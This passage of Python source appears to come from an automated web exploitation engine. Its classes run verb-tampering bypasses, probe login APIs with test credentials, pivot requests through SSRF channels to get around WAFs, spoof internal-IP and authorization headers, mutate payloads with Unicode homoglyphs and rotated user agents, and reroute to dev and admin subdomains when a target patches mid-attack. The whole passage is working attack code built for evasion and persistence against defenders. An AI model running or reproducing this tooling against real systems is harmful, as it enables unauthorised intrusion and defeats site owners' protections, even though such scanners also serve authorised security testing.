                text = f"{getattr(f, 'title', '')} {getattr(f, 'description', '')} {getattr(f, 'evidence', '')}"
            for match in auth_patterns.findall(text):
                clean = match.split("?")[0].split("#")[0].rstrip("/")
                if clean and len(clean) > 3:
                    discovered.add(clean)
        return list(discovered)

    async def attempt_verb_tampering(
        self,
        endpoint: str,
        blocked_status: int,
    ) -> Optional[Dict]:
        if blocked_status not in (403, 405, 503):
            return None

        self.log(
            f"[DRIFT-VERB] HTTP {blocked_status} at {endpoint} — initiating Verb Tampering: "
            f"testing {', '.join(self.VERB_TAMPER_METHODS)}",
            "error", "adversarial"
        )

        for method in self.VERB_TAMPER_METHODS:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = await asyncio.wait_for(
                    self.client.request(method, url),
                    timeout=5.0,
                )
                result = {
                    "endpoint": endpoint,
                    "method": method,
                    "original_status": blocked_status,
                    "new_status": resp.status_code,
                    "success": resp.status_code < 400,
                    "body_preview": resp.text[:300],
                    "timestamp": _ts(),
                }
                self.verb_tamper_results.append(result)

                if resp.status_code < 400:
                    self.log(
                        f"[DRIFT-VERB] ★ VERB BYPASS: {endpoint} blocked with GET/POST (HTTP {blocked_status}) "
                        f"but accepts {method} (HTTP {resp.status_code})",
                        "error", "adversarial"
                    )
                    self.add_finding({
                        "title": f"Verb Tampering Bypass: {method} accepted at {endpoint}",
                        "description": (
                            f"Drift Recalibrator detected HTTP {blocked_status} on direct access to {endpoint}. "
                            f"Verb Tampering revealed that {method} is accepted (HTTP {resp.status_code}), "
                            f"bypassing WAF/method restrictions. The endpoint likely processes requests "
                            f"differently per HTTP method, allowing auth bypass or data extraction."
                        ),
                        "severity": "critical",
                        "category": "verb_tampering_drift",
                        "module": "adversarial_engine",
                        "phase": "adversarial",
                        "evidence": resp.text[:200],
                    })
                    self.add_probe({
                        "probe_type": "VERB_TAMPER_DRIFT",
                        "target": self.base_url,
                        "endpoint": endpoint,
                        "method": method,
                        "status_code": resp.status_code,
                        "vulnerable": True,
                        "verdict": f"VERB BYPASS — {method} accepted where GET/POST blocked ({blocked_status})",
                        "severity": "CRITICAL",
                        "timestamp": _ts(),
                    })
                    return result
                elif resp.status_code == 405:
                    allowed = resp.headers.get("Allow", "")
                    if allowed:
                        self.log(
                            f"[DRIFT-VERB] {method} → 405 but server disclosed Allow: {allowed}",
                            "warn", "adversarial"
                        )
                        result["allowed_methods"] = allowed

            except Exception:
                pass

        self.log(
            f"[DRIFT-VERB] No verb bypass found for {endpoint} — all methods blocked/rejected",
            "warn", "adversarial"
        )
        return None

    async def discover_auth_api_endpoint(
        self,
        blocked_endpoint: str,
        findings: List[Dict],
    ) -> Optional[Dict]:
        self.log(
            f"[DRIFT-AUTH] Direct path {blocked_endpoint} blocked — "
            f"scanning Source Map + JS Secrets for real auth API endpoint...",
            "error", "adversarial"
        )

        candidates = self._extract_auth_endpoints_from_findings(findings)

        for static_candidate in self.AUTH_API_CANDIDATES:
            if static_candidate not in candidates:
                candidates.append(static_candidate)

        self.log(
            f"[DRIFT-AUTH] Testing {len(candidates)} auth API candidates "
            f"({len(candidates) - len(self.AUTH_API_CANDIDATES)} from Source Map/findings)...",
            "warn", "adversarial"
        )

        for candidate in candidates[:20]:
            url = f"{self.base_url}{candidate}"
            try:
                resp = await asyncio.wait_for(
                    self.client.post(
                        url,
                        json={"email": "test@test.com", "password": "test"},
                        headers={"Content-Type": "application/json"},
                    ),
                    timeout=5.0,
                )

                is_auth = (
                    resp.status_code in (200, 201, 400, 401, 422)
                    and any(kw in resp.text.lower() for kw in [
                        "token", "password", "email", "invalid", "unauthorized",
                        "credentials", "auth", "login", "user", "session", "jwt",
                    ])
                )

                if is_auth:
                    discovery = {
                        "blocked_endpoint": blocked_endpoint,
                        "real_auth_endpoint": candidate,
                        "status_code": resp.status_code,
                        "body_preview": resp.text[:300],
                        "from_source_map": candidate in self._extract_auth_endpoints_from_findings(findings),
                        "timestamp": _ts(),
                    }
                    self.api_auth_discoveries.append(discovery)

                    self.log(
                        f"[DRIFT-AUTH] ★ REAL AUTH ENDPOINT DISCOVERED: {candidate} "
                        f"(HTTP {resp.status_code}) — {blocked_endpoint} was a frontend facade, "
                        f"API processes auth at {candidate}",
                        "error", "adversarial"
                    )
                    self.add_finding({
                        "title": f"Auth API Discovered: {candidate} (behind blocked {blocked_endpoint})",
                        "description": (
                            f"Drift Recalibrator found that {blocked_endpoint} is blocked (frontend facade), "
                            f"but the real authentication API lives at {candidate} (HTTP {resp.status_code}). "
                            f"{'Discovered via Source Map/JS Secrets analysis.' if discovery['from_source_map'] else 'Discovered via API endpoint enumeration.'} "
                            f"Direct credential testing should target this endpoint."
                        ),
                        "severity": "high",
                        "category": "auth_endpoint_discovery",
                        "module": "adversarial_engine",
                        "phase": "adversarial",
                        "evidence": resp.text[:200],
                    })
                    self.add_probe({
                        "probe_type": "AUTH_API_DISCOVERY",
                        "target": self.base_url,
                        "endpoint": candidate,
                        "method": "POST",
                        "status_code": resp.status_code,
                        "vulnerable": True,
                        "verdict": f"AUTH ENDPOINT at {candidate} — {blocked_endpoint} was facade",
                        "severity": "HIGH",
                        "timestamp": _ts(),
                    })
                    return discovery

            except Exception:
                pass

        self.log(
            f"[DRIFT-AUTH] No auth API endpoint found for {blocked_endpoint}",
            "warn", "adversarial"
        )
        return None

    async def ssrf_internal_post(
        self,
        endpoint: str,
        payload: Dict,
        ssrf_channels: List[Dict],
    ) -> Optional[Dict]:
        if not ssrf_channels:
            return None

        self.log(
            f"[DRIFT-SSRF] External access to {endpoint} blocked — "
            f"attempting internal POST via {len(ssrf_channels)} SSRF channels "
            f"(internal requests bypass external WAF/firewall rules)",
            "error", "adversarial"
        )

        for channel in ssrf_channels[:3]:
            ssrf_ep = channel["endpoint"]
            ssrf_param = channel["param"]

            internal_url = f"{self.base_url.rstrip('/')}{endpoint}"
            pivot_url = f"{self.base_url}{ssrf_ep}?{ssrf_param}={quote(internal_url)}"

            try:
                resp = await asyncio.wait_for(
                    self.client.post(
                        pivot_url,
                        json=payload,
                        headers={
                            "Content-Type": "application/json",
                            "X-Forwarded-For": "127.0.0.1",
                            "X-Real-IP": "127.0.0.1",
                        },
                    ),
                    timeout=8.0,
                )

                result = {
                    "endpoint": endpoint,
                    "ssrf_channel": ssrf_ep,
                    "ssrf_param": ssrf_param,
                    "status_code": resp.status_code,
                    "body_preview": resp.text[:400],
                    "bypassed_waf": resp.status_code < 400,
                    "timestamp": _ts(),
                }
                self.ssrf_internal_pivots.append(result)

                if resp.status_code < 400:
                    self.log(
                        f"[DRIFT-SSRF] ★ INTERNAL BYPASS: {endpoint} accessible via SSRF through {ssrf_ep} "
                        f"(HTTP {resp.status_code}) — WAF/firewall rules bypassed on internal network",
                        "error", "adversarial"
                    )
                    self.add_finding({
                        "title": f"WAF Bypass: Internal POST via SSRF at {ssrf_ep} → {endpoint}",
                        "description": (
                            f"External access to {endpoint} was blocked by WAF. "
                            f"Drift Recalibrator routed the POST through confirmed SSRF channel at {ssrf_ep}?{ssrf_param}= "
                            f"to reach {endpoint} internally. Internal requests bypass external WAF/firewall rules. "
                            f"Response: HTTP {resp.status_code}."
                        ),
                        "severity": "critical",
                        "category": "ssrf_internal_bypass",
                        "module": "adversarial_engine",
                        "phase": "adversarial",
                        "evidence": resp.text[:300],
                    })
                    self.add_probe({
                        "probe_type": "SSRF_INTERNAL_POST",
                        "target": self.base_url,
                        "endpoint": f"{ssrf_ep} → {endpoint}",
                        "method": "POST",
                        "status_code": resp.status_code,
                        "vulnerable": True,
                        "verdict": f"INTERNAL BYPASS — POST via SSRF channel bypasses WAF",
                        "severity": "CRITICAL",
                        "timestamp": _ts(),
                    })
                    return result

            except Exception:
                pass

        self.log(
            f"[DRIFT-SSRF] No SSRF internal route succeeded for {endpoint}",
            "warn", "adversarial"
        )
        return None

    async def detect_and_recalibrate(
        self,
        endpoint: str,
        original_status: int,
        current_status: int,
        discovered_subdomains: List[str],
        findings: Optional[List[Dict]] = None,
        ssrf_channels: Optional[List[Dict]] = None,
    ) -> Optional[Dict]:
        patched = current_status in (403, 404, 405, 503) and original_status in (200, 201, 202)
        if not patched:
            return None

        self.log(
            f"[DRIFT] ★ PATCHING DETECTED: {endpoint} changed from "
            f"HTTP {original_status} → {current_status} during operation",
            "error", "adversarial"
        )

        patch_event = {
            "endpoint": endpoint,
            "original_status": original_status,
            "current_status": current_status,
            "timestamp": _ts(),
            "recalibrated": False,
            "alternative_route": None,
            "verb_tamper_bypass": None,
            "auth_api_discovery": None,
            "ssrf_internal_pivot": None,
        }
        self.patched_endpoints.append(patch_event)

        if current_status in (405, 403):
            verb_result = await self.attempt_verb_tampering(endpoint, current_status)
            if verb_result and verb_result.get("success"):
                patch_event["recalibrated"] = True
                patch_event["verb_tamper_bypass"] = verb_result
                return {
                    "original_endpoint": endpoint,
                    "recalibration_type": "verb_tampering",
                    "method": verb_result["method"],
                    "new_url": f"{self.base_url}{endpoint}",
                    "status_code": verb_result["new_status"],
                    "timestamp": _ts(),
                }

        is_auth_endpoint = any(
            kw in endpoint.lower()
            for kw in ["login", "auth", "signin", "admin"]
        )
        if is_auth_endpoint and findings:
            auth_discovery = await self.discover_auth_api_endpoint(endpoint, findings)
            if auth_discovery:
                patch_event["recalibrated"] = True
                patch_event["auth_api_discovery"] = auth_discovery

                recal = {
                    "original_endpoint": endpoint,
                    "recalibration_type": "auth_api_discovery",
                    "new_host": "same",
                    "new_url": f"{self.base_url}{auth_discovery['real_auth_endpoint']}",
                    "real_auth_endpoint": auth_discovery["real_auth_endpoint"],
                    "status_code": auth_discovery["status_code"],
                    "timestamp": _ts(),
                }
                self.recalibrations.append(recal)
                return recal

        if ssrf_channels:
            ssrf_result = await self.ssrf_internal_post(
                endpoint,
                {"email": "test@test.com", "password": "test"},
                ssrf_channels,
            )
            if ssrf_result and ssrf_result.get("bypassed_waf"):
                patch_event["recalibrated"] = True
                patch_event["ssrf_internal_pivot"] = ssrf_result

                recal = {
                    "original_endpoint": endpoint,
                    "recalibration_type": "ssrf_internal_post",
                    "ssrf_channel": ssrf_result["ssrf_channel"],
                    "new_url": f"{self.base_url}{ssrf_result['ssrf_channel']}",
                    "status_code": ssrf_result["status_code"],
                    "timestamp": _ts(),
                }
                self.recalibrations.append(recal)
                return recal

        parsed = urlparse(self.base_url)
        original_host = parsed.hostname or ""

        alt_hosts = []
        for subdomain in discovered_subdomains:
            if subdomain != original_host:
                alt_hosts.append(subdomain)

        prefixes = ["dev", "staging", "api", "internal", "admin", "test", "beta", "v2"]
        domain_parts = original_host.split(".")
        if len(domain_parts) >= 2:
            base_domain = ".".join(domain_parts[-2:])
            for prefix in prefixes:
                candidate = f"{prefix}.{base_domain}"
                if candidate not in alt_hosts and candidate != original_host:
                    alt_hosts.append(candidate)

        self.log(
            f"[DRIFT] Recalibrating via {len(alt_hosts)} alternative routes...",
            "warn", "adversarial"
        )

        for alt_host in alt_hosts[:8]:
            alt_url = f"{parsed.scheme}://{alt_host}{endpoint}"
            try:
                resp = await asyncio.wait_for(
                    self.client.get(alt_url),
                    timeout=5.0,
                )
                if resp.status_code < 400:
                    route = {
                        "original": f"{self.base_url}{endpoint}",
                        "alternative": alt_url,
                        "host": alt_host,
                        "status_code": resp.status_code,
                        "timestamp": _ts(),
                    }
                    self.alternative_routes.append(route)
                    patch_event["recalibrated"] = True
                    patch_event["alternative_route"] = alt_url

                    self.log(
                        f"[DRIFT] ★ RECALIBRATED: {endpoint} → {alt_host} "
                        f"(HTTP {resp.status_code}) — Endpoint still accessible via alternative host",
                        "error", "adversarial"
                    )

                    recal = {
                        "original_endpoint": endpoint,
                        "recalibration_type": "subdomain_reroute",
                        "new_host": alt_host,
                        "new_url": alt_url,
                        "status_code": resp.status_code,
                        "timestamp": _ts(),
                    }
                    self.recalibrations.append(recal)
                    return recal

            except Exception:
                pass

        self.log(
            f"[DRIFT] No alternative routes found for {endpoint} — endpoint appears fully patched",
            "warn", "adversarial"
        )
        return None

    def to_dict(self) -> Dict:
        return {
            "patched_endpoints": len(self.patched_endpoints),
            "patched_details": self.patched_endpoints,
            "recalibrations": len(self.recalibrations),
            "recalibration_details": self.recalibrations,
            "alternative_routes_found": len(self.alternative_routes),
            "verb_tamper_results": self.verb_tamper_results,
            "verb_tamper_bypasses": sum(1 for v in self.verb_tamper_results if v.get("success")),
            "api_auth_discoveries": self.api_auth_discoveries,
            "ssrf_internal_pivots": self.ssrf_internal_pivots,
            "ssrf_internal_bypasses": sum(1 for s in self.ssrf_internal_pivots if s.get("bypassed_waf")),
        }


class AdversarialStateMachine:
    def __init__(
        self,
        base_url: str,
        client: httpx.AsyncClient,
        findings: List[Dict],
        decision_tree: DecisionTree,
        log_fn=None,
        emit_fn=None,
        add_finding_fn=None,
        add_probe_fn=None,
    ):
        self.base_url = base_url
        self.client = client
        self.findings = findings
        self.tree = decision_tree
        self.log = log_fn or (lambda *a: None)
        self.emit = emit_fn or (lambda *a: None)
        self.add_finding = add_finding_fn or (lambda *a: None)
        self.add_probe = add_probe_fn or (lambda *a: None)

        self.current_state = SniperState.INIT
        self.transitions: List[StateTransition] = []
        self.chain: List[ChainLink] = []
        self.priorities: List[TargetPriority] = []

        self.calculator = CostRewardCalculator()
        self.polymorphic = PolymorphicPayloadEngine()
        self.escalation = PrivilegeEscalationModule(
            client, base_url, log_fn, emit_fn, add_finding_fn, add_probe_fn,
        )
        self.incident_validator = IncidentValidator(
            client, base_url, log_fn, add_finding_fn, add_probe_fn,
        )
        self.drift_recalibrator = DriftRecalibrator(
            client, base_url, log_fn, emit_fn, add_finding_fn, add_probe_fn,
        )
        self.stealth = decision_tree.stealth if hasattr(decision_tree, 'stealth') else StealthThrottle(log_fn=log_fn, emit_fn=emit_fn)

        self.waf_block_counts: Dict[str, Dict] = {}
        self.leaked_data: Dict[str, Any] = {}
        self.confirmed_ssrf_channels: List[Dict] = []
        self.discovered_subdomains: List[str] = []
        self.internal_services: List[Dict] = []
        self.data_drift_events: List[Dict] = []

        self._extract_subdomains()
        self._seed_waf_rates()

    def _seed_waf_rates(self):
        for result in self.tree.all_results:
            vc = result.vuln_class if isinstance(result.vuln_class, str) else result.vuln_class
            blocked = result.status_code in (403, 429, 503) and not result.vulnerable
            self._track_waf(vc, blocked)

        if self.tree.waf.attempts > 0:
            seeded = sum(c["total"] for c in self.waf_block_counts.values())
            self.log(
                f"[FSM] WAF rates seeded from DecisionTree: {seeded} results across "
                f"{len(self.waf_block_counts)} vuln classes",
                "warn", "adversarial"
            )

    def _extract_subdomains(self):
        for f in self.findings:
            combined = f"{f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')}".lower()
            subs = re.findall(r"([a-z0-9](?:[a-z0-9\-]*[a-z0-9])?\.(?:[a-z0-9](?:[a-z0-9\-]*[a-z0-9])?\.)*[a-z]{2,})", combined)
            for s in subs:
                if s not in self.discovered_subdomains and len(s) > 5:
                    self.discovered_subdomains.append(s)

    def _transition(self, new_state: SniperState, condition: str, data: Optional[Dict] = None):
        t = StateTransition(
            from_state=self.current_state,
            to_state=new_state,
            condition=condition,
            timestamp=time.time(),
            data=data,
        )
        self.transitions.append(t)
        self.log(
            f"[FSM] {self.current_state.value} → {new_state.value} | {condition}",
            "warn", "adversarial"
        )
        self.current_state = new_state
        self.emit("state_transition", {
            "from": t.from_state.value,
            "to": t.to_state.value,
            "condition": condition,
        })

    def _track_waf(self, vuln_class: str, blocked: bool):
        if vuln_class not in self.waf_block_counts:
            self.waf_block_counts[vuln_class] = {"total": 0, "blocked": 0}
        self.waf_block_counts[vuln_class]["total"] += 1
        if blocked:
            self.waf_block_counts[vuln_class]["blocked"] += 1

    def _get_waf_block_rate(self, vuln_class: str) -> float:
        counts = self.waf_block_counts.get(vuln_class, {"total": 0, "blocked": 0})
        if counts["total"] == 0:
            return 0.0
        return counts["blocked"] / counts["total"]

    async def execute(self) -> Dict:
        self.log(
            "[FSM] ★ ADVERSARIAL STATE MACHINE INITIALIZED — "
            "Entering zero-knowledge exploitation cycle",
            "error", "adversarial"
        )
        self._transition(SniperState.SURFACE_ANALYSIS, "Engine initialized")
        self.emit("adversarial_start", {"findings_count": len(self.findings)})

        await self._state_surface_analysis()
        await self._state_cost_reward()
        await self._state_target_prioritization()

        for priority in self.priorities:
            self._transition(
                SniperState.PAYLOAD_SELECTION,
                f"Processing {priority.vuln_class.value} (ratio={priority.ratio})",
            )

            waf_rate = self._get_waf_block_rate(priority.vuln_class.value)
            if waf_rate >= 0.85:
                self._transition(
                    SniperState.POLYMORPHIC_MUTATION,
                    f"WAF blocking {waf_rate:.0%} — switching to polymorphic payloads",
                )
                await self._state_polymorphic_attack(priority)
            else:
                self._transition(
                    SniperState.EXPLOITATION,
                    f"Standard exploitation — WAF rate {waf_rate:.0%}",
                )
                await self._state_standard_exploitation(priority)

            self._transition(SniperState.DRIFT_CHECK, "Post-exploitation drift analysis")
            await self._state_drift_check(priority)

            self._transition(SniperState.PIVOT_ASSESSMENT, "Assessing pivot opportunities")
            await self._state_pivot_assessment(priority)

            self._transition(SniperState.INCIDENT_VALIDATION, "Validating real-world impact")
            await self._state_incident_validation(priority)

        self._transition(SniperState.TELEMETRY, "All chains processed — compiling report")
        return self._build_report()

    async def _state_surface_analysis(self):
        self.log(
            f"[SURFACE] Analyzing {len(self.findings)} findings for exploitation surface...",
            "warn", "adversarial"
        )
        self.log(
            f"[SURFACE] Infrastructure: {self.tree.infra.detected.value.upper()} | "
            f"Subdomains discovered: {len(self.discovered_subdomains)} | "
            f"Vuln classes: {len(self.tree.vuln_classes_detected)}",
            "warn", "adversarial"
        )

    async def _state_cost_reward(self):
        self._transition(SniperState.COST_REWARD_CALC, "Calculating cost/reward ratios")

        for vuln_class, source_findings in self.tree.vuln_classes_detected.items():
            waf_rate = self._get_waf_block_rate(vuln_class.value)
            priority = self.calculator.calculate(
                vuln_class, source_findings, self.tree.infra, waf_rate,
            )
            self.priorities.append(priority)
            self.log(
                f"[CALC] {vuln_class.value.upper()}: cost={priority.cost} reward={priority.reward} "
                f"ratio={priority.ratio} depth={priority.depth_potential} | {priority.reasoning}",
                "warn", "adversarial"
            )

    async def _state_target_prioritization(self):
        self._transition(SniperState.TARGET_PRIORITIZATION, "Ranking targets by exploitation value")

        self.priorities.sort(key=lambda p: p.ratio, reverse=True)

        self.log("[PRIORITY] Target execution order (highest value first):", "warn", "adversarial")
        for i, p in enumerate(self.priorities):
            self.log(
                f"[PRIORITY] #{i+1} {p.vuln_class.value.upper()} — "
                f"ratio={p.ratio} depth={p.depth_potential} "
                f"({'★ HIGH VALUE' if p.ratio > 3 else '◆ STANDARD'})",
                "error" if p.ratio > 3 else "warn", "adversarial"
            )

        self.emit("target_priorities", {
            "order": [
                {
                    "rank": i + 1,
                    "class": p.vuln_class.value,
                    "ratio": p.ratio,
                    "cost": p.cost,
                    "reward": p.reward,
                    "depth": p.depth_potential,
                    "reasoning": p.reasoning,
                }
                for i, p in enumerate(self.priorities)
            ],
        })

    async def _state_standard_exploitation(self, priority: TargetPriority):
        vuln_class = priority.vuln_class
        tree_results = [
            r for r in self.tree.all_results
            if r.vuln_class == vuln_class.value
        ]

        confirmed = [r for r in tree_results if r.vulnerable]
        blocked = [r for r in tree_results if r.status_code in (403, 429, 503) and not r.vulnerable]

        self.log(
            f"[EXPLOIT] {vuln_class.value.upper()}: {len(confirmed)} confirmed, "
            f"{len(blocked)} blocked, {len(tree_results)} total from DecisionTree",
            "warn" if not confirmed else "error", "adversarial"
        )

        for result in confirmed:
            link = ChainLink(
                step=len(self.chain) + 1,
                state=SniperState.EXPLOITATION,
                vuln_class=vuln_class.value,
                technique=result.technique,
                target_endpoint=result.target_endpoint,
                payload=result.payload[:200],
                status_code=result.status_code,
                success=True,
                evidence=result.evidence[:300],
                timestamp=_ts(),
            )

            if result.deep_validation:
                link.leaked_data = result.deep_validation

            self.chain.append(link)
            self._track_waf(vuln_class.value, False)

        for result in blocked:
            self._track_waf(vuln_class.value, True)

        new_waf_rate = self._get_waf_block_rate(vuln_class.value)
        if new_waf_rate >= 0.85 and len(blocked) >= 5:
            self.log(
                f"[EXPLOIT] WAF escalation: {vuln_class.value.upper()} now at {new_waf_rate:.0%} block rate "
                f"— triggering polymorphic mutation fallback with evasion tactics",
                "error", "adversarial"
            )
            self._transition(
                SniperState.POLYMORPHIC_MUTATION,
                f"Block rate escalated to {new_waf_rate:.0%} during standard exploitation",
            )
            await self._state_polymorphic_attack(priority)

            still_blocked = self._get_waf_block_rate(vuln_class.value) >= 0.85
            if still_blocked and self.confirmed_ssrf_channels and blocked:
                self.log(
                    f"[EXPLOIT] Polymorphic evasion failed to reduce WAF block rate — "
                    f"Hacker Reasoning pivot: routing {vuln_class.value.upper()} through "
                    f"{len(self.confirmed_ssrf_channels)} confirmed SSRF channels (internal bypass)",
                    "error", "adversarial"
                )
                for b_result in blocked[:3]:
                    ep_parts = b_result.target_endpoint.split("?")
                    await self._attempt_ssrf_pivot_for_blocked(
                        priority, ep_parts[0], b_result.payload
                    )

        node = next(
            (n for n in self.tree.nodes if n.vuln_class == vuln_class), None,
        )
        if node and not confirmed:
            ctx = node._extract_context()
            endpoints = ctx["endpoints"][:3]
            params = ctx["params"][:2]
            payloads = self._get_base_payloads(vuln_class)

            for payload_def in payloads[:2]:
                for endpoint in endpoints[:2]:
                    for param in params[:2]:
                        url = f"{self.base_url}{endpoint}?{param}={payload_def['payload']}"
                        await self.stealth.wait()
                        start = time.time()
                        try:
                            resp = await self.client.get(url)
                            elapsed = int((time.time() - start) * 1000)
                            body = resp.text[:4000]
                            blocked_now = resp.status_code in (403, 429, 503)
                            self._track_waf(vuln_class.value, blocked_now)
                            await self.stealth.record(resp.status_code)

                            hit = not blocked_now and any(
                                kw.lower() in body.lower()
                                for kw in payload_def.get("detect", [])
                            )

                            if hit:
                                link = ChainLink(
                                    step=len(self.chain) + 1,
                                    state=SniperState.EXPLOITATION,
                                    vuln_class=vuln_class.value,
                                    technique=f"adversarial:{payload_def['name']}",
                                    target_endpoint=f"{endpoint}?{param}=",
                                    payload=payload_def["payload"][:200],
                                    status_code=resp.status_code,
                                    success=True,
                                    evidence=body[:300],
                                    timestamp=_ts(),
                                )
                                self.chain.append(link)
                                self.log(
                                    f"[EXPLOIT] ★ {vuln_class.value.upper()} confirmed via adversarial probe "
                                    f"at {endpoint}?{param}=",
                                    "error", "adversarial"
                                )
                                self.add_finding({
                                    "title": f"Adversarial Exploit: {vuln_class.value.upper()} [{payload_def['name']}]",
                                    "description": (
                                        f"Adversarial FSM confirmed {vuln_class.value} via {payload_def['name']} "
                                        f"at {endpoint}?{param}=. Cost/reward ratio: {priority.ratio}."
                                    ),
                                    "severity": "critical" if priority.depth_potential >= 8 else "high",
                                    "category": vuln_class.value,
                                    "module": "adversarial_engine",
                                    "phase": "adversarial",
                                    "evidence": body[:200],
                                })
                                self.add_probe({
                                    "probe_type": f"ADV_{vuln_class.value.upper()}",
                                    "target": self.base_url,
                                    "endpoint": f"{endpoint}?{param}=",
                                    "method": "GET",
                                    "status_code": resp.status_code,
                                    "response_time_ms": elapsed,
                                    "vulnerable": True,
                                    "verdict": f"CONFIRMED — {payload_def['name']}",
                                    "severity": "CRITICAL" if priority.depth_potential >= 8 else "HIGH",
                                    "description": f"Adversarial: {vuln_class.value} — {payload_def['name']}",
                                    "payload": payload_def["payload"][:100],
                                    "timestamp": _ts(),
                                })
                                return
                        except Exception:
                            pass

    _EVASION_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    ]

    @staticmethod
    def _unicode_normalize_payload(payload: str) -> str:
        replacements = {
            "'": "\u2019", '"': "\u201C", "<": "\uFF1C", ">": "\uFF1E",
            "/": "\u2215", "\\": "\uFF3C", "(": "\uFF08", ")": "\uFF09",
            "=": "\uFF1D", ";": "\uFF1B", "&": "\uFF06", " ": "\u00A0",
        }
        return "".join(replacements.get(c, c) for c in payload)

    def _build_evasion_headers(self, generation: int = 0) -> Dict[str, str]:
        ua = self._EVASION_USER_AGENTS[generation % len(self._EVASION_USER_AGENTS)]
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
        }
        if generation >= 1:
            headers["Transfer-Encoding"] = "chunked"
            headers["X-Forwarded-For"] = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            headers["X-Real-IP"] = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
        if generation >= 2:
            headers["X-Originating-IP"] = f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
            headers["X-Custom-IP-Authorization"] = "127.0.0.1"
        return headers

    async def _attempt_ssrf_pivot_for_blocked(self, priority: TargetPriority, blocked_endpoint: str, blocked_payload: str) -> bool:
        if not self.confirmed_ssrf_channels:
            return False

        self.log(
            f"[SSRF-PIVOT] WAF blocked direct access to {blocked_endpoint} — "
            f"pivoting through {len(self.confirmed_ssrf_channels)} confirmed SSRF channels",
            "error", "adversarial"
        )

        for channel in self.confirmed_ssrf_channels[:3]:
            ssrf_ep = channel["endpoint"]
            ssrf_param = channel["param"]
            internal_target = f"{self.base_url.rstrip('/')}{blocked_endpoint}"
            if blocked_payload:
                internal_target += f"?payload={quote(blocked_payload)}"

            pivot_url = f"{self.base_url}{ssrf_ep}?{ssrf_param}={quote(internal_target)}"
            evasion_headers = self._build_evasion_headers(generation=2)

            await self.stealth.wait()
            start = time.time()
            try:
                resp = await self.client.get(pivot_url, headers=evasion_headers)
                elapsed = int((time.time() - start) * 1000)
                body = resp.text[:4000]

                if resp.status_code < 400 and resp.status_code != 204:
                    link = ChainLink(
                        step=len(self.chain) + 1,
                        state=SniperState.LATERAL_MOVEMENT,
                        vuln_class=priority.vuln_class.value,
                        technique="ssrf_waf_pivot",
                        target_endpoint=f"{ssrf_ep}?{ssrf_param}= → {blocked_endpoint}",
                        payload=internal_target[:200],
                        status_code=resp.status_code,
                        success=True,
                        evidence=f"WAF bypassed via internal SSRF pivot: {body[:200]}",
                        timestamp=_ts(),
                    )
                    self.chain.append(link)

                    self.log(
                        f"[SSRF-PIVOT] ★ WAF BYPASSED via internal SSRF: {ssrf_ep} → {blocked_endpoint} "
                        f"(HTTP {resp.status_code}, {elapsed}ms) — internal requests bypass external WAF rules",
                        "error", "adversarial"
                    )

                    self.add_finding({
                        "title": f"WAF Bypass via SSRF Pivot [{priority.vuln_class.value}]",
                        "description": (
                            f"Direct access to {blocked_endpoint} blocked by WAF (403). "
                            f"Adversarial FSM pivoted through confirmed SSRF channel at {ssrf_ep}?{ssrf_param}= "
                            f"to reach the endpoint internally, bypassing external WAF rules. "
                            f"Internal requests are not subject to WAF filtering."
                        ),
                        "severity": "critical",
                        "category": "waf_bypass_ssrf_pivot",
                        "module": "adversarial_engine",
                        "phase": "adversarial",
                        "evidence": body[:300],
                    })

                    self.add_probe({
                        "probe_type": "SSRF_WAF_PIVOT",
                        "target": self.base_url,
                        "endpoint": f"{ssrf_ep} → {blocked_endpoint}",
                        "method": "GET",
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "vulnerable": True,
                        "verdict": f"WAF BYPASSED — SSRF internal pivot via {ssrf_ep}",
                        "severity": "CRITICAL",
                        "timestamp": _ts(),
                    })
                    return True

                await self.stealth.record(resp.status_code)
            except Exception:
                pass

        self.log(
            f"[SSRF-PIVOT] No successful SSRF pivot route for {blocked_endpoint}",
            "warn", "adversarial"
        )
        return False

    async def _state_polymorphic_attack(self, priority: TargetPriority):
        vuln_class = priority.vuln_class
        self.log(
            f"[POLYMORPHIC] WAF resistance detected for {vuln_class.value} — "
            f"activating evasion tactics: User-Agent spoofing + Chunked Transfer-Encoding + Unicode normalization",
            "error", "adversarial"
        )

        node = next(
            (n for n in self.tree.nodes if n.vuln_class == vuln_class), None,
        )
        if not node:
            return

        ctx = node._extract_context()
        endpoints = ctx["endpoints"][:3] or ["/api/proxy", "/api/search"]
        params = ctx["params"][:2] or ["url", "q"]

        base_payloads = self._get_base_payloads(vuln_class)
        ssrf_pivot_attempted = False

        for payload_def in base_payloads[:3]:
            mutations = self.polymorphic.mutate(payload_def["payload"], vuln_class)

            unicode_variant = self._unicode_normalize_payload(payload_def["payload"])
            if unicode_variant != payload_def["payload"]:
                mutations.append(PolymorphicPayload(
                    original=payload_def["payload"],
                    mutated=unicode_variant,
                    technique="Unicode Normalization Bypass",
                    generation=0,
                    entropy=round(len(set(unicode_variant)) / max(len(unicode_variant), 1), 3),
                ))

            self.log(
                f"[POLYMORPHIC] Generated {len(mutations)} mutations for '{payload_def['name']}' "
                f"(incl. Unicode normalization variant)",
                "warn", "adversarial"
            )

            consecutive_blocks = 0
            for mutation in mutations[:4]:
                for endpoint in endpoints[:2]:
                    for param in params[:2]:
                        url = f"{self.base_url}{endpoint}?{param}={mutation.mutated}"
